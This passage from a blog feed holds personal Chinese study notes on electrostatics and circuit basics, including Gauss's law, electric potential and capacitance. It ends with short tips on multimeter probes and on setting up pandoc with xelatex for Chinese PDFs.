就选取一个最容易计算的高斯面 (一般是球). 如:<br><img src="/../img/guass_surface_sphere.png"></p><p>然后就有这样的推导:<br>$$<br>\oint E \cdot dA &#x3D; \oint E dA &#x3D; E \oint dA &#x3D; E(4\pi r^2)<br>$$<br>为什么能直接将 $E \cdot dA$ 写成 $EdA$ ?</p><p>从球心到球面的连线即半径是垂直于 surface 的, 见上图, 电场方向和 surface 垂直方向相同.</p><p>我们知道:<br>$$<br>E &#x3D; \frac{1}{4\pi \epsilon_0} \frac{Q}{r^2}<br>$$</p><p>就可以得到:<br>$$<br>E(4\pi r^2) &#x3D; \frac{Q}{\epsilon_0}<br>$$</p><p>也就推出了高斯定理.</p><p>最后:<br>$$<br>\oint E \cdot dA &#x3D; \oint \frac{1}{4\pi \epsilon_0} \frac{Q}{r^2} dA &#x3D; \frac{Q}{4\pi \epsilon_0 r^2}(4 \pi r^2) &#x3D; \frac{Q}{\epsilon_0}<br>$$</p><p>为什么能用理想的球推出来的高斯公式计算不规则图形 ?<br><img src="/../img/irregular.png"></p><p>看图可知, 既然通过的电场线的条数相同, 用球计算出来的也就和不规则图形的相同.</p><p>Coulomb’s Law 不能描述由变化的磁场产生的电场. 但是 Gauss’s Law 适用于任何场景.</p><h2 id="20-3-高斯定理的应用-Application-of-Gauss’s-Law"><a href="#20-3-高斯定理的应用-Application-of-Gauss’s-Law" class="headerlink" title="20.3 高斯定理的应用 Application of Gauss’s Law"></a>20.3 高斯定理的应用 Application of Gauss’s Law</h2><p>为什么说高斯定理是描述 electric charge 和 electric field 的关系 ?</p><p>看公式就知道,<br>$$<br>\oint E \cdot dA &#x3D; \frac{Q_{encl}}{\epsilon_0}<br>$$</p><p>左侧是 electric field, 右侧是 electric charge.</p><p>一般考虑 surface 为对称的, 这样 E 才会是 constant 或者在部分表面是均匀的.</p><p>重点在于计算出 $Q_{encl}$ 的值.</p><h3 id="典型题"><a href="#典型题" class="headerlink" title="典型题"></a>典型题</h3><h4 id="Spherical-conductor"><a href="#Spherical-conductor" class="headerlink" title="Spherical conductor"></a>Spherical conductor</h4><p>这种题, 是导体, 不管是空心还是实心, 都是一样的结果, 外部有电场, 内部电场为零:<br><img src="/../img/spherical_conductor.png"></p><p>求外电场, 主要就是选取高斯面, $r &gt; r_0$, $r_0$ 是导体的半径.</p><p>选取的高斯面要包裹住原来的导体, 其内部的 $Q_{encl}$ 就是导体所带的电荷量.</p><h4 id="Solid-sphere-of-charge"><a href="#Solid-sphere-of-charge" class="headerlink" title="Solid sphere of charge"></a>Solid sphere of charge</h4><p>这种是非导体, 但是电荷分布均匀, 计算外部的电场同样是直接选取 $r &gt; r_0$ 的高斯面.</p><p>计算内部的电场时, 需要使用 charge density $\rho_E$, 且选取的高斯面 $r &lt; r_0$:<br><img src="/../img/solid_spere.png"></p><h4 id="Long-uniform-line-of-charge"><a href="#Long-uniform-line-of-charge" class="headerlink" title="Long uniform line of charge"></a>Long uniform line of charge</h4><p>题目如下:<br><img src="/../img/long_uniform_line_of_charge.png"></p><p>书中的计算公式:<br>$$<br>\oint E \cdot dA &#x3D; E(2\pi rl) &#x3D; \frac{Q_{encl}}{\epsilon_0} &#x3D; \frac{\lambda l}{\epsilon_0}<br>$$<br>为何公式仍然适用 ? 并没有用球形的高斯面 ?</p><p>暂时不清楚, (可能是和 Coulomb’s law 中的 k 的推导有关, 那么 k 和 $\epsilon_0$ 的关系是如何推导的) 似乎都能用这个式子计算. 选取的高斯面, 电场线最好垂直于 surface.</p><h4 id="Infinite-plane-of-charge"><a href="#Infinite-plane-of-charge" class="headerlink" title="Infinite plane of charge"></a>Infinite plane of charge</h4><p>题目如下:<br><img src="/../img/infinite_plane_of_charge.png"></p><p>这里选取的高斯面是上下两个平面.</p><h4 id="Electric-field-near-any-conducting-surface"><a href="#Electric-field-near-any-conducting-surface" class="headerlink" title="Electric field near any conducting surface"></a>Electric field near any conducting surface</h4><p>题目如下:<br><img src="/../img/electric_field_near_any_conducting_surface.png"></p><p>同样是直接应用高斯定理, 已知 surface charge density 为 $\sigma$:<br>$$<br>\oint E \cdot dA &#x3D; EA &#x3D; \frac{Q_{encl}}{\epsilon_0} &#x3D; \frac{\sigma A}{\epsilon_0}<br>$$</p><p>最终得到:<br>$$<br>E &#x3D; \frac{\sigma}{\epsilon_0}<br>$$</p><h1 id="Chapter-21-电势能-Electric-Potential"><a href="#Chapter-21-电势能-Electric-Potential" class="headerlink" title="Chapter 21 电势能 Electric Potential"></a>Chapter 21 电势能 Electric Potential</h1><h2 id="21-1-Electric-Potential-and-Potential-Difference"><a href="#21-1-Electric-Potential-and-Potential-Difference" class="headerlink" title="21.1 Electric Potential and Potential Difference"></a>21.1 Electric Potential and Potential Difference</h2><p>Potential energy can be defined only for a conservatice force.</p><p>Conservative force 做的功和路径无关, 与距离相关.</p><p>定义 potential energy 为 U.</p><p>定义的 $U_b - U_a$ 是从 a 移动到 b. 为什么 ?<br>可以理解为以前记忆的 <mark>末减初</mark> 就能得到中间的变化量. </p><p>为什么电场力做正功, potential energy 减小 ?<br>也就是说转换成了其他的能量. 比如电场力作正功时给粒子加速, 动能增大, 势能减少.</p><p>定义 electric potential (电势) 为 potential energy per unit charge:<br>$$<br>V_a &#x3D; \frac{U_a}{q}<br>$$</p><p><mark>只有电势差有物理含义</mark> </p><p>常用的公式:<br>$$<br>V_{ba} &#x3D; V_b - V_a &#x3D; \frac{U_b - U_a}{q} &#x3D; - \frac{W_{ba}}{q}<br>$$</p><p>电势的单位是电压 volt:<br>$$<br>1V &#x3D; 1 J&#x2F;C<br>$$</p><p>常常把地面或连接到地面的导体视为电势为零.<br>$$<br>U_b - U_a &#x3D; q(V_b - V_a) &#x3D; qV_{ba}<br>$$<br>电荷经过 $V_{ba}$ 电势之后的势能变化量为 $qV_ba$.</p><p>一个类比:<br><img src="/../img/analogy_gravity_electric.png"></p><p>在相同的高度, 重量越大的物体, 其重力势能越大 (mgh).<br>在相同电势的位置, 电荷量越大, 电势能也越大 ($qV_{ba}$.</p><h2 id="21-2-Relation-Between-Electric-Potential-and-Electric-Field"><a href="#21-2-Relation-Between-Electric-Potential-and-Electric-Field" class="headerlink" title="21.2 Relation Between Electric Potential and Electric Field"></a>21.2 Relation Between Electric Potential and Electric Field</h2><p>$$<br>\because U_b - U_a &#x3D; - w_{ba} &#x3D; - \int_a^b F \cdot dl<br>$$</p><p>$$<br>V_ba &#x3D; V_b - V_a &#x3D; \frac{U_b - U_a}{q} &#x3D; - \int_a^b \frac{F}{q} \cdot dl &#x3D; - \int_a^b E \cdot dl &#x3D; -E \int_a^b dl &#x3D; -Ed<br>$$</p><h3 id="类型题"><a href="#类型题" class="headerlink" title="类型题"></a>类型题</h3><h4 id="Charge-conducting-sphere"><a href="#Charge-conducting-sphere" class="headerlink" title="Charge conducting sphere"></a>Charge conducting sphere</h4><p><img src="/../img/charged_conducting_sphere.png"></p><p>求外部电场 E 同样用到高斯定理, 内部电场为 0.</p><h4 id="Breakdown-voltage"><a href="#Breakdown-voltage" class="headerlink" title="Breakdown voltage"></a>Breakdown voltage</h4><p>在 high voltages 下, 空气会被电离形成电场. 被加速的电子会碰撞 $O_2$ 和 $N_2$, 使得更多的电子被撞出, 这时空气变成了导体, 有电流流动.</p><p><img src="/../img/breakdown_voltage.png"></p><p>利用上一道题得到的结论:<br>$$<br>V &#x3D; \frac{1}{4\pi \epsilon_0} \frac{Q}{r_0}, E &#x3D; \frac{1}{4\pi \epsilon_0} \frac{Q}{r_0^2}<br>$$</p><p>可以得到:<br>$$<br>V &#x3D; r_0 E<br>$$</p><h2 id="21-3-Electric-Potential-Due-to-Point-Charges"><a href="#21-3-Electric-Potential-Due-to-Point-Charges" class="headerlink" title="21.3 Electric Potential Due to Point Charges"></a>21.3 Electric Potential Due to Point Charges</h2><p>主要就是这个公式:</p><p>$$<br>V &#x3D; \frac{1}{4\pi \epsilon_0} \frac{Q}{r}<br>$$</p><p>推导过程就是:<br>$$<br>V_b - V_a &#x3D; - \int_{r_a}^{r_b} E \cdot dl &#x3D; - \frac{Q}{4\pi \epsilon_0} \int_{r_a}^{r_b} \frac{1}{r^2} dr &#x3D; \frac{1}{4\pi \epsilon_0}( \frac{Q}{r_b} - \frac{Q}{r_a})<br>$$<br>用来计算这种, 由一个带电物体产生的电场, 距离 r 处的电势:<br><img src="/../img/divergence_electric_field.png"></p><p>我们可以把产生电场的正电荷所在位置电势视为无限大 ($\infty$), 把无穷远处的电势视为 0.</p><p>电荷分布均匀的球体外部电场强度都相同.</p><h3 id="习题-21-6"><a href="#习题-21-6" class="headerlink" title="习题 21-6"></a>习题 21-6</h3><p><img src="/../img/move_charge.png"></p><p>记住, 电势是 $J &#x2F; C$ 就行.</p><h3 id="习题-21-7"><a href="#习题-21-7" class="headerlink" title="习题 21-7"></a>习题 21-7</h3><p>一个点处的电势来自于两个电荷. 已知电荷量求电势的题. </p><p><img src="/../img/potential_comes_two_charges.png"></p><p>主要就是利用:<br>$$<br>V &#x3D; \frac{1}{4\pi \epsilon_0} \frac{Q}{r}<br>$$<br>这个体现电势和电荷关系的公式.</p><p>分别计算两个电荷产生的电势并相加.</p><h2 id="21-4-均匀分布的电荷产生的电势-Potential-Due-to-Any-Charge-Distribution"><a href="#21-4-均匀分布的电荷产生的电势-Potential-Due-to-Any-Charge-Distribution" class="headerlink" title="21-4 均匀分布的电荷产生的电势 Potential Due to Any Charge Distribution"></a>21-4 均匀分布的电荷产生的电势 Potential Due to Any Charge Distribution</h2><p>也就是求存在多个 charge 的电场中的 potential.</p><p>根据已学的公式, 已知 Q 或 E 都能用于计算 V.<br>$$<br>V &#x3D; \frac{1}{4\pi \epsilon_0} \frac{Q}{r}<br>$$<br>多个电场时公式变为:<br>$$<br>V_a &#x3D; \sum_{i&#x3D;1}^n V_i &#x3D; \frac{1}{4\pi \epsilon_0} \sum_{i&#x3D;1}^n \frac{Q_i}{r_ia}<br>$$<br>这里就体现了将每个电荷作用的电势累加.</p><p>如果电荷是均匀分布的, 那就可以写为:<br>$$<br>V &#x3D; \frac{1}{4\pi \epsilon_0} \int\frac{dq}{r}<br>$$</p><h3 id="习题-21-8"><a href="#习题-21-8" class="headerlink" title="习题 21-8"></a>习题 21-8</h3><p>charge 均匀分布在圆环上, 直接用公式积分就行:<br><img src="/../img/charge_on_ring_distribute.png"></p><h3 id="习题-21-9"><a href="#习题-21-9" class="headerlink" title="习题 21-9"></a>习题 21-9</h3><p>charge 均匀分布在圆盘上, 思路就是先求环的积分, 再求整个盘. 求环的积分, 求的是其上的电荷量.<br><img src="/../img/charge_distribute_on_disk.png"></p><p>利用二重积分计算的思路, 主要要求出单个点处的电势. 可以利用:<br>$$<br>\frac{dq}{dA} &#x3D; \frac{Q}{A}<br>$$<br>这样的等式.</p><h2 id="21-5-等势面-Equipotential-Surfaces"><a href="#21-5-等势面-Equipotential-Surfaces" class="headerlink" title="21.5 等势面 Equipotential Surfaces"></a>21.5 等势面 Equipotential Surfaces</h2><p>电势能够通过画等势面来表示, 等势面就是这个面上所有的点, 其电势都相同. </p><p>面上两点之间的电势差为零, 在同一等势面上移动不做功.</p><p>等势面一定是和电场垂直. </p><p><mark>理解为什么是垂直的?&lt;\mark&gt;</p><p>从前面可以知道, 等势面上所有的点的电势是相同的, 在其上的移动不做功, 如果电场不是垂直的, 如:<br><img src="/../img/charge_move_on_equipotential_surface.png"></p><p>那么就会有在其移动方向上的分量, 就会做功, 不满足.</p><p>从 $\Delta V &#x3D; - \int E \cdot dl$ 这个公式也能看出, 当 $\Delta V$ 为 0 时, 也就是两个向量相互垂直.</p><p>电场线的方向是从高电势指向低电势.</p><p>这里又提到了, 在静电场中, 导体内部的电场为零, 因为导体内的电荷是自由流动的, 若是收到了电场力的作用, 其会移动, 直到平衡.</p><p>导体的表面就是一个等势面. 电场线和导体表面始终垂直. (毕竟内部为 0, 向量垂直)</p><h2 id="21-6-Electric-Dipoles"><a href="#21-6-Electric-Dipoles" class="headerlink" title="21.6 Electric Dipoles"></a>21.6 Electric Dipoles</h2><p>还是和之前某一节中讲的相同的概念:</p><p>两个电荷, 具有相同的电荷量, 电性相反, 间隔 a distance $l$, 被称作 electric dipole.</p><p>其通过用电荷量来计算电势的公式为:<br>$$<br>V &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{Q}{r} + \frac{1}{4 \pi \epsilon_0} \frac{-Q}{r + \Delta r} &#x3D; \frac{Q}{4 \pi \epsilon_0} \frac{\Delta r}{r( r+\Delta r )}<br>$$<br>这里, 当 $r$ 远大于 $l$ 时, 我们又知道 $\Delta r \approx l cos\theta$, 因此 $r &gt;&gt; \Delta r$, 就可以将其在分母部分忽略, 于是公式变成:<br>$$<br>V &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{Ql cos\theta}{r^2} &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{p cos\theta}{r^2}<br>$$<br>这里 $p &#x3D; Ql$, p 就是 dipole moment.<br><img src="/../img/dipole_moment_two.png"></p><p>从图中可以看出这里为什么是 $\Delta r \approx l cos\theta$, 当 $r &gt;&gt; l$ 时, $\theta \approx 90^\circ$, $r_1$ 和 $r_2$ 几乎平行.</p><p>$\theta$ 是负电荷那边的角度, 其决定了 $V$ 的正负值, 当其为 $0^\circ \sim 90^\circ$ 时, $V$ 为正, 其为 $90^\circ \sim 180^\circ$ 时, 为负.</p><p>dipole 的 potential 随 $r$ 的变化而变化得比单个 charge 更快:</p><p>dipole -&gt; $\frac{1}{r^2}$</p><p>sigle charge -&gt; $\frac{1}{r}$</p><h3 id="习题-21-10"><a href="#习题-21-10" class="headerlink" title="习题 21-10"></a>习题 21-10</h3><p>第一个问是已知 dipole moment 和 distance 求 dipole 的电荷量.<br>利用 $Q &#x3D; \frac{p}{l}$ 可以计算.</p><p>第二问是已知距离求 potential, 先画图判断正负<br><img src="/../img/carbon_oxygen_dipole.png"></p><p>记住, $\theta$ 在靠近负电荷的那一边.</p><p>然后利用:<br>$$<br>V &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{p \cos \theta}{r^2}<br>$$<br>来通过 distance 和 dipole moment 算 potential.<br><img src="/../img/carbon_oxygen_dipole_question.png"></p><h2 id="21-7-E-Determined-from-V"><a href="#21-7-E-Determined-from-V" class="headerlink" title="21.7 E Determined from V"></a>21.7 E Determined from V</h2><p>微分形式:<br>$dV &#x3D; -E \cdot dl &#x3D; -E_1 dl$<br>这里的 $E_1$ 是 $E$ 在 $dl$ 方向的分量.</p><p>可以写成:<br>$E_1 &#x3D; - \frac{dV}{dl}$</p><p>这里的 $\frac{dV}{dl}$ 也被称为 V 在某个特定方向的梯度. 如果方向没有指明, 这里就指 V 变化最快的方向.</p><p>如果 E 是 $x,y,z$ 的方程, 那么:</p><p>$E_x &#x3D; - \frac{\partial V}{\partial x}$, $E_y &#x3D; - \frac{\partial V}{\partial y}$, $E_z &#x3D; - \frac{\partial V}{\partial z}$</p><h3 id="习题-21-11"><a href="#习题-21-11" class="headerlink" title="习题 21-11"></a>习题 21-11</h3><p>利用这两个图:<br><img src="/../img/two_pic_ring_and_disk.png"></p><p>只不过使用 $x,y,z$ 的方程计算. 一般先算出 V, 再计算 E. (V 是标量, E 是矢量).</p><p>这里提到了 gradient operator: $\Delta &#x3D; i \frac{\partial}{\partial x} + j \frac{\partial}{\partial y} + k \frac{\partial}{\partial z}$</p><h2 id="21-8-电势能-电子伏特-Electrostatic-Potential-Energy-the-Electron-Volt"><a href="#21-8-电势能-电子伏特-Electrostatic-Potential-Energy-the-Electron-Volt" class="headerlink" title="21.8 电势能, 电子伏特 Electrostatic Potential Energy; the Electron Volt"></a>21.8 电势能, 电子伏特 Electrostatic Potential Energy; the Electron Volt</h2><p>这一节将 $eV$ 这个单位. <mark>为什么要引入这个单位 ?</mark> </p><p>用来表示一个电子所做的功.</p><p>若系统中只有一个电荷, 那么也就不存在 potential energy, 但如果系统中有两个电荷:</p><p>$V &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{Q_1}{r_{12}}$</p><p>$r_{12}$ 是两个电荷的距离:</p><p>$U &#x3D; Q_2 V &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{Q_1 Q_2}{r_{12}}$</p><p>如果有三个, 那么总的 potential energy 就是:<br>$$<br>U &#x3D; \frac{1}{4 \pi \epsilon_0} ( \frac{Q_1 Q_2}{r_{12}} + \frac{Q_1 Q_3}{r_{13}} +\frac{Q_2 Q_3}{r_{23}} )<br>$$<br>两两组合.</p><p>$1 eV &#x3D; 1.6 \times 10^{-19} J$</p><h3 id="习题-21-12"><a href="#习题-21-12" class="headerlink" title="习题 21-12"></a>习题 21-12</h3><p>计算将氧原子上的 proton 和 electron 分开需要的能量, 需要记得加上电子在轨道上运动的动能.<br><img src="/../img/disassembling_a_hydrogen_atom.png"></p><p>前一部分计算的实际上是从无穷远处移到相隔 $l$ 处所需要的能量:<br><img src="/../img/disassembling_hydrogen.png"></p><h1 id="Chapter-22-Capacitance-Dielectrics-Electric-Energy-Storage"><a href="#Chapter-22-Capacitance-Dielectrics-Electric-Energy-Storage" class="headerlink" title="Chapter 22 Capacitance, Dielectrics, Electric Energy Storage"></a>Chapter 22 Capacitance, Dielectrics, Electric Energy Storage</h1><h2 id="22-1-Capacitors"><a href="#22-1-Capacitors" class="headerlink" title="22.1 Capacitors"></a>22.1 Capacitors</h2><p>A capacitor 有时也被称为 condenser, 可以存储 electric charge, 常常由两个导体, 放得接近但是不接触组成.</p><p>非常小的 capacitors 用来电脑 RAM 中存储 0 和 1 的二进制.</p><p>常常两个板子卷成圆柱体, 中间夹着纸或者其他 insulator:<br><img src="/../img/capacitor_seperate_by_insulators.png"></p><p>capacitor 的 symbol 为:<br><img src="/../img/capacitor_symbol.png"></p><p>电源也可以看作是 capacitor, 从其符号也可以看出来:<br><img src="/../img/source_symbol.png"></p><p>将电源和 capacitor 联通可以充电:<br>$$<br>Q &#x3D; C V_{ab}<br>$$<br><img src="/../img/charge_capacitors.png"></p><p>这里的 $C$ 就是 capacitance of the capacitor. 单位是 $C &#x2F; V$, 即 $F$, a farad.</p><p>$C$ 的值取决与 capacitor 的大小, 形状, 两个导体的相对距离, 以及材料.</p><h2 id="22-2-Dtermination-of-Capacitance"><a href="#22-2-Dtermination-of-Capacitance" class="headerlink" title="22.2 Dtermination of Capacitance"></a>22.2 Dtermination of Capacitance</h2><p>推导公式, 这里假设 capacitors 的形状简单, 之间的 insulator 为真空或空气, 两个 conductor 之间的距离 $d$ 很短, 每一个 plate 的面积为 A.</p><p>根据 $E &#x3D; \frac{\sigma}{\epsilon_0}$ 和 $\sigma &#x3D; \frac{Q}{A}$ 得到:<br>$$<br>E &#x3D; \frac{Q}{\epsilon_0 A}<br>$$<br>又因为:<br>$$<br>V_{ba} &#x3D; - \int_a^b E \cdot dl<br>$$<br>这里是点乘, 也就是向量, 需要知道 E 和 $dl$ 之间的角度, 从图上可以看出, a -&gt; b 的方向和 E 的方向相反, 则 $\theta &#x3D; 180^\circ$, 即 $\cos 180^\circ &#x3D; -1$:<br><img src="/../img/derive_equation_of_capacitance.png"></p><p>则有:<br>$$<br>V_{ba} &#x3D; V_b - V_a &#x3D; -\int_a^b E dl \cos 180^\circ &#x3D; +\int_a^b E dl &#x3D; \frac{Q}{\epsilon_0 A} \int_a^b dl &#x3D; \frac{Q d}{\epsilon_0 A}<br>$$</p><p>最终:<br>$$<br>C &#x3D; \frac{Q}{V_{ba}} &#x3D; \epsilon_0 \frac{A}{d}<br>$$</p><h3 id="习题-22-1"><a href="#习题-22-1" class="headerlink" title="习题 22-1"></a>习题 22-1</h3><p>(a) 已知面积 A 和 distance d 求 capacitance. 利用 $C &#x3D; \epsilon_0 \frac{A}{d}$ 计算.</p><p>(b) 已知 C 和 V 计算 Q.</p><p>(c) 已知 Q 计算 E.</p><h3 id="习题-22-2"><a href="#习题-22-2" class="headerlink" title="习题 22-2"></a>习题 22-2</h3><p>这道题是让我们推导出一个计算 C 的公式, 一个重点在于求 a long wire 外的电场:<br><img src="/../img/cylindrical_capacitor.png"></p><p>下面的那个是截面图.</p><p>a long wire 外的电场的推导式为:<br>$$<br>dq &#x3D; \lambda dl<br>$$<br>形成的电场 $dE$ 为:<br>$$<br>dE &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{dq}{r^2}<br>$$<br><img src="/../img/long_wire_field.png"></p><p>因为 $E_y &#x3D; 0$ 我们可以知道:<br>$$<br>E &#x3D; E_x &#x3D; \int dE \cos \theta<br>$$<br>又 $y &#x3D; x \tan \theta$, 具体看书, 约去一部分后就有了:<br>$$<br>E &#x3D; \frac{1}{2 \pi \epsilon_0} \frac{\lambda}{x}<br>$$</p><h3 id="习题-22-3"><a href="#习题-22-3" class="headerlink" title="习题 22-3"></a>习题 22-3</h3><p>这道题是两个同心球, 图像同样是截面图:<br><img src="/../img/spherical_capacitor.png"></p><p>主要还是先求电场, 然后再利用 $V_{ab} &#x3D; -\int E \cdot dl$ 来求电势.</p><p>这里求电场用的是高斯定理. 其算出, the electric field outside a uniformly charged conducting sphere is $E &#x3D; \frac{Q}{4 \pi \epsilon_0 r^2}$.</p><p>只有一层 conductor 的也可以 capacitor, 只不过假设与另一层的距离为 $\infty$</p><h2 id="22-3-Capacitors-in-Series-and-Parallel"><a href="#22-3-Capacitors-in-Series-and-Parallel" class="headerlink" title="22.3 Capacitors in Series and Parallel"></a>22.3 Capacitors in Series and Parallel</h2>]]></content>
    
    
    <categories>
      
      <category>Physics</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>尼尔森电路-Notes</title>
    <link href="/2022/10/08/%E5%B0%BC%E5%B0%94%E6%A3%AE%E7%94%B5%E8%B7%AF-Notes/"/>
    <url>/2022/10/08/%E5%B0%BC%E5%B0%94%E6%A3%AE%E7%94%B5%E8%B7%AF-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="第1章-电路变量"><a href="#第1章-电路变量" class="headerlink" title="第1章 电路变量"></a>第1章 电路变量</h1><h3 id="1-1-1-电路理论"><a href="#1-1-1-电路理论" class="headerlink" title="1.1.1 电路理论"></a>1.1.1 电路理论</h3><p>波长 $\lambda$ 等于信号的速度除以频率, 即 $\lambda &#x3D; c &#x2F; f$.</p><p>记忆方法, $\lambda$ 看作是路程, c 是光速, 即速度, f 是时间.</p><p>如果信号的波长比系统的物理尺寸大得多, 则称系统为 <mark>集总参数系统</mark> (电信号能同时影响系统中的所有点).</p><h2 id="1-2-国际单位制"><a href="#1-2-国际单位制" class="headerlink" title="1.2 国际单位制"></a>1.2 国际单位制</h2><p><img src="/../img/SI_unit.png" alt="SI unit"></p><p>一般使用的指数为能被 3 整除的幂, 如: $10^{-5}$ 常写为 $10^{-5} &#x3D; 10 \times 10^{-6}$.</p><h2 id="1-4-电压与电流"><a href="#1-4-电压与电流" class="headerlink" title="1.4 电压与电流"></a>1.4 电压与电流</h2><p>电荷的特性:</p><ul><li>电荷量是离散量, 是电子电荷量 $1.6022 \times 10^{-19} C$ 的整数倍.</li><li>电现象归结为电荷的分离和电荷的运动</li></ul><p>在电路理论中, 电荷的分离引起电能 (电压), 电荷的运动引起电的流动 (电流).</p><p>无论是正电荷还是负电荷被分离, 都要消耗能量. 可以想, 一正一负两个电荷起初很接近, 要让正电荷远离, 需要做负功, 消耗能量转换成势能.</p><p><mark>电压</mark> 是由分离引起的单位电荷的能量 (将正负电荷分开, 要做负功, 也就是消耗能量, 这个时候势能也就是电压就会产生), 表示为微分量的比:</p><p>$v &#x3D; \frac{\partial w}{\partial q}$</p><h2 id="第一章习题"><a href="#第一章习题" class="headerlink" title="第一章习题"></a>第一章习题</h2><h3 id="1-9"><a href="#1-9" class="headerlink" title="1.9"></a>1.9</h3><p>关于:</p><p>$dq &#x3D; 20cos5000y dy$</p><p>这种式子的解法.</p><p>两边同时积分. 这里 substitute x for q on the left side and y for t on the right side:</p><p>$\int_{q(0)}^{q(t)}dx &#x3D; 20\int_0^tcos5000ydy$</p><p>为什么是 $q(t)$ 和 $q(0)$, 因为可能有常数.</p><h3 id="1-10"><a href="#1-10" class="headerlink" title="1.10"></a>1.10</h3><p>这里的一个单位不太清楚:</p><p>$elec&#x2F;s$</p><p>这个其实不用管, 这个直接理解就是每秒多少个电子.</p><h3 id="1-11"><a href="#1-11" class="headerlink" title="1.11"></a>1.11</h3><p>什么是阿托焦耳 $(aJ)$ 单位.</p><p>$aJ$ 表示 $10^{-18}J$ </p><h3 id="1-12"><a href="#1-12" class="headerlink" title="1.12"></a>1.12</h3><p>电路元件的功率为正表示 <mark>吸收功率</mark>.</p><p>电路元件的功率为负表示 <mark>释放功率</mark>.</p><p>电压的正负表示电子通过这个电路元件的时候是 <mark>压降</mark>  还是 <mark>压升</mark>. </p><p>比如, 电压为 $60V$, 意思就是电子通过时电压下降, 因此电子获得能量.</p><h3 id="1-14"><a href="#1-14" class="headerlink" title="1.14"></a>1.14</h3><p>电压的极性可以用来判断电压下降的方向.</p><p>压降和电流的方向结合用来判断一个电路元件是吸收功率还是释放功率.</p><h3 id="1-15"><a href="#1-15" class="headerlink" title="1.15"></a>1.15</h3><p>电流的方向似乎和电压的正负关系不大.</p><h3 id="1-18"><a href="#1-18" class="headerlink" title="1.18"></a>1.18</h3><p>计算电路元件的端电压和电流释放到元件上的总能量, 需要计算无穷的积分, 如:</p><p>$\int_0^{+\infty}$</p><h3 id="1-29"><a href="#1-29" class="headerlink" title="1.29"></a>1.29</h3><p>用电流和电压计算功率 $p$ 之前要先判断是 $p &#x3D; ui$ 还是 $p &#x3D; -ui$</p><p>通过电流方向和压降判断.</p><h3 id="1-30"><a href="#1-30" class="headerlink" title="1.30"></a>1.30</h3><p>功率检查, 就是计算释放功率和吸收功率, 看其值是否相等.</p>]]></content>
    
    
    <categories>
      
      <category>CAD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Electric-Circuits-Notes</title>
    <link href="/2022/10/07/Electric-Circuits-Notes/"/>
    <url>/2022/10/07/Electric-Circuits-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="Chapter-1-VOLTAGE-CURRENT-POWER-AND-SOURCES"><a href="#Chapter-1-VOLTAGE-CURRENT-POWER-AND-SOURCES" class="headerlink" title="Chapter 1 VOLTAGE, CURRENT, POWER, AND SOURCES"></a>Chapter 1 VOLTAGE, CURRENT, POWER, AND SOURCES</h1>]]></content>
    
    
    <categories>
      
      <category>CAD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>红黑表笔的使用</title>
    <link href="/2022/10/07/%E7%BA%A2%E9%BB%91%E8%A1%A8%E7%AC%94%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/10/07/%E7%BA%A2%E9%BB%91%E8%A1%A8%E7%AC%94%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="红黑线插的位置"><a href="#红黑线插的位置" class="headerlink" title="红黑线插的位置"></a>红黑线插的位置</h1><p>COM (common) 孔, 为公共孔, 插黑色表笔.</p><p>其他的孔为插红表笔.</p><h1 id="电流的进入和输出"><a href="#电流的进入和输出" class="headerlink" title="电流的进入和输出"></a>电流的进入和输出</h1><p>黑表笔接负极, 红表笔接正极.</p><p>使用万用表内部电源时, 红表笔接的内部电源的正极, 黑表笔接的内部电源的负极.</p><p>红正黑负 – 便于记忆.</p>]]></content>
    
    
    <categories>
      
      <category>CAD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-pandoc-无法处理中文</title>
    <link href="/2022/10/07/%E5%85%B3%E4%BA%8E-pandoc-%E6%97%A0%E6%B3%95%E5%A4%84%E7%90%86%E4%B8%AD%E6%96%87/"/>
    <url>/2022/10/07/%E5%85%B3%E4%BA%8E-pandoc-%E6%97%A0%E6%B3%95%E5%A4%84%E7%90%86%E4%B8%AD%E6%96%87/</url>
    
    <content type="html"><![CDATA[<p>原本想将 markdown 文件转换成 pdf 文件, 结果遇到了:<br><img src="/../img/pandoc_error.png" alt="pandoc error"></p><h1 id="参考1"><a href="#参考1" class="headerlink" title="参考1"></a><a href="https://www.jianshu.com/p/15e5b9faad01">参考1</a></h1><p>由于编译 pandoc 默认的 latex 引擎是 pdflatex, 其不支持中文.  </p><p>需要手动设置编译时所引用的引擎, 改为 xelatex:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ pandoc infile.md -o outfile.pdf --latex-engine=xelatex<br></code></pre></td></tr></table></figure><p>还需设置中文字体. 需和系统中已装的字体相同.</p><p>如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ pandoc infile.md -o outfile.pdf --latex-engine=xelatex -V mainfont=<span class="hljs-string">&quot;SimSun&quot;</span><br></code></pre></td></tr></table></figure><h1 id="参考2"><a href="#参考2" class="headerlink" title="参考2"></a><a href="https://jdhao.github.io/2017/12/10/pandoc-markdown-with-chinese/">参考2</a></h1><p>Pandoc 将 Markdown 文件转为 PDF 文件的步骤:</p><ul><li>将 Markdown 文件转为 LaTeX 源文件</li><li>调用系统的 <code>pdflatex</code>, <code>xelatex</code> 或其他命令, 将 <code>.tex</code> 文件转换为最终的 PDF 文件.</li></ul><p>使用 <code>CJKmainfont</code> 指定字体.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ pandoc --pdf-engine=xelatex -V CJKmainfont=<span class="hljs-string">&quot;font name&quot;</span> test.md -o test1.pdf<br></code></pre></td></tr></table></figure><p>可使用 <code>fc-list</code> 来查看系统中安装的字体.</p><figure class="highlight 